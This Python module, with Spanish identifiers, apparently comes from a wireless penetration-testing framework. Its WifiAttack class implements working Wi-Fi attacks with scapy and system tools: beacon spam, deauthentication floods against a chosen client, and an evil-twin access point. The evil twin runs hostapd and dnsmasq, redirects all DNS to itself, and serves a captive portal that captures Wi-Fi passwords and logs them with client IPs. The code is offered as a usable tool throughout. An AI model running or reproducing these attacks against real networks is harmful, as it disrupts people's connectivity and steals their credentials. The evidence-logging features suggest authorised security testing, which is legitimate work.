from __future__ import annotations

import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path

from core.evidence_bridge import register_evidence

try:
    from scapy.all import Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt, RadioTap, RandMAC, sendp
    ESPACIO_RADIO_DISPONIBLE = True
except ImportError:
    ESPACIO_RADIO_DISPONIBLE = False

    class RadioTap:
        pass

    class Dot11:
        pass

    def RandMAC(): return "00:00:00:00:00:00"
    def sendp(*args, **kwargs): pass

try:
    from .EvilTwinServer import EvilTwinServer
    EVIL_TWIN_WEB_DISPONIBLE = True
except ImportError:
    EVIL_TWIN_WEB_DISPONIBLE = False
    EvilTwinServer = None


class WifiAttack:
    def __init__(self, sentinel, iface_mon: str = "wlan0mon", iface_ap: str = "wlan0"):
        self.sentinel = sentinel
        self.iface_mon = iface_mon
        self.iface_ap = iface_ap
        self.ataca_activo = False
        self._temp_files: list[Path] = []

        self._portal_server = None

        if not ESPACIO_RADIO_DISPONIBLE:
            self.sentinel.console.print(
                "[yellow][!] Scapy no detectado. Modo SIMULACIÓN activo.[/yellow]")

    def beacon_spam(self, ssid_base="ANUBIS_"):
        self.ataca_activo = True
        self.sentinel.console.print(
            f"[cyan][*] Lanzando Beacon Spam en {self.iface_mon}...[/cyan]")
        self.sentinel.reportes.registrar_evento(
            "WIFI", f"Iniciando Beacon Spam: {ssid_base}")

        def spam():
            while self.ataca_activo:
                if not ESPACIO_RADIO_DISPONIBLE:
                    time.sleep(2)
                    continue
                for i in range(50):
                    if not self.ataca_activo:
                        break
                    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                                  addr2=RandMAC(), addr3=RandMAC())
                    beacon = Dot11Beacon(cap="ESS+privacy")
                    nombre_red = f"{ssid_base}{i:02}"
                    essid = Dot11Elt(
                        ID="SSID", info=nombre_red, len=len(nombre_red))
                    frame = RadioTap()/dot11/beacon/essid
                    sendp(frame, iface=self.iface_mon,
                          count=1, inter=0.05, verbose=0)

        threading.Thread(target=spam, daemon=True).start()

    def deauth(self, target_mac: str, ap_mac: str):
        if not ESPACIO_RADIO_DISPONIBLE:
            self.sentinel.console.print(
                f"[dim][SIM] Deauth ficticio: {target_mac} → {ap_mac}[/dim]")
            return

        self.sentinel.console.print(
            f"[cyan][*] Desautenticando {target_mac} de {ap_mac}...[/cyan]")
        pkt = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac,
                               addr3=ap_mac)/Dot11Deauth(reason=7)
        sendp(pkt, iface=self.iface_mon, count=200, inter=0.05, verbose=0)
        self.sentinel.reportes.registrar_evento(
            "WIFI", f"Deauth real enviado a {target_mac}")

    def _run(self, cmd: list[str]) -> None:
        try:
            subprocess.run(
                cmd, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            self.sentinel.console.print(
                f"[red][!] Error ejecutando {cmd[0]}: {e}[/red]")

    def _on_credential_captured(self, ssid: str, password: str, ip: str) -> None:
        try:
            ts = time.strftime("%Y%m%d_%H%M%S")
            temp_file = Path(tempfile.gettempdir()) / \
                f"captura_evil_twin_{ssid}_{ts}.txt"

            contenido = (
                "=== REGISTRO DE CAPTURA EVIL TWIN ===\n"
                f"SSID Suplantado: {ssid}\n"
                f"IP del Cliente:  {ip}\n"
                f"Credencial:      {password}\n"
                f"Timestamp:       {time.ctime()}\n"
                "=====================================\n"
            )
            temp_file.write_text(contenido, encoding="utf-8")

            workspace = getattr(self.sentinel, "workspace", Path.cwd())
            operator_id = getattr(self.sentinel, "operator_id", "op-mariano")

            final_dir = register_evidence(
                workspace=workspace,
                operator_id=operator_id,
                artifact_path=temp_file,
                artifact_type="wifi_credential",
                details={"ssid": ssid, "client_ip": ip}
            )

            self.sentinel.console.print(
                f"\n[bold green][+] CREDENCIAL CAPTURADA Y FIRMADA:[/bold green] {password}")
            self.sentinel.console.print(
                f"[dim]    Evidencia asegurada en: {final_dir.name}[/dim]")
            self.sentinel.reportes.registrar_evento(
                "WIFI", f"Credencial capturada para SSID: {ssid}")

        except Exception as e:
            self.sentinel.console.print(
                f"\n[bold red][!] ERROR FORENSE: Credencial no pudo firmarse: {e}[/bold red]")

    def crear_gemelo_malvado(self, ssid: str, canal: int = 6):
        self.sentinel.console.print(
            f"\n[bold yellow][!] INICIANDO GEMELO MALVADO: {ssid}[/bold yellow]")

        if EVIL_TWIN_WEB_DISPONIBLE:
            try:
                self._portal_server = EvilTwinServer(
                    ssid=ssid,
                    log=self.sentinel.log,
                    on_capture=self._on_credential_captured  # <-- CONECTAMOS EL FORENSE
                )
                self._portal_server.iniciar()
                self.sentinel.console.print(
                    "[green][+] Portal web y módulo forense listos.[/green]")
            except Exception as e:
                self.sentinel.console.print(
                    f"[bold red][!] Error al iniciar portal web: {e}[/bold red]")
                self._portal_server = None
        else:
            self.sentinel.console.print(
                "[yellow][!] EvilTwinServer no encontrado. Solo red.[/yellow]")

        if sys.platform != "linux":
            self.sentinel.console.print(
                f"[dim][SIM] AP Virtual '{ssid}' en canal {canal}...[/dim]")
            return

        self._run(["sudo", "systemctl", "stop", "NetworkManager"])
        self._run(["sudo", "killall", "hostapd", "dnsmasq"])
        self._run(["sudo", "ifconfig", self.iface_ap,
                  "192.168.1.1", "netmask", "255.255.255.0"])
        self._run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
        self._run(["sudo", "iptables", "--flush"])
        self._run(["sudo", "iptables", "-t", "nat", "-A",
                  "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"])
        self._run(["sudo", "iptables", "-A", "FORWARD", "-i",
                  self.iface_ap, "-o", "eth0", "-j", "ACCEPT"])

        hostapd_conf = Path(tempfile.gettempdir()) / "hostapd_anubis.conf"
        hostapd_conf.write_text(
            f"interface={self.iface_ap}\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel={canal}\nauth_algs=1\nwmm_enabled=0\n")
        self._temp_files.append(hostapd_conf)

        dnsmasq_conf = Path(tempfile.gettempdir()) / "dnsmasq_anubis.conf"
        dnsmasq_conf.write_text(
            f"interface={self.iface_ap}\ndhcp-range=192.168.1.10,192.168.1.100,8h\naddress=/#/192.168.1.1\n")
        self._temp_files.append(dnsmasq_conf)

        subprocess.Popen(['sudo', 'hostapd', str(
            hostapd_conf)], stdout=subprocess.DEVNULL)
        subprocess.Popen(
            ['sudo', 'dnsmasq', '-C', str(dnsmasq_conf), '-d'], stdout=subprocess.DEVNULL)

        self.sentinel.reportes.registrar_evento(
            "WIFI", f"Evil Twin activo: {ssid}")
        self.sentinel.console.print(
            "[green][+] Red AP y DNS redirigidos activos.[/green]")

    def detener_ataques(self):
        self.ataca_activo = False
        self.sentinel.console.print(
            "[cyan][*] Abortando ataques y limpiando sistema...[/cyan]")

        if self._portal_server is not None:
            try:
                self._portal_server.detener()
                self.sentinel.console.print(
                    "[green][+] Portal web detenido.[/green]")
            except Exception as e:
                self.sentinel.console.print(
                    f"[red][!] Error deteniendo portal web: {e}[/red]")
            finally:
                self._portal_server = None

        if sys.platform == "linux":
            self._run(["sudo", "killall", "hostapd", "dnsmasq"])
            self._run(["sudo", "iptables", "--flush"])
            self._run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"])
            self._run(["sudo", "systemctl", "start", "NetworkManager"])

        for f in self._temp_files:
            if f.exists():
                f.unlink()
        self._temp_files.clear()
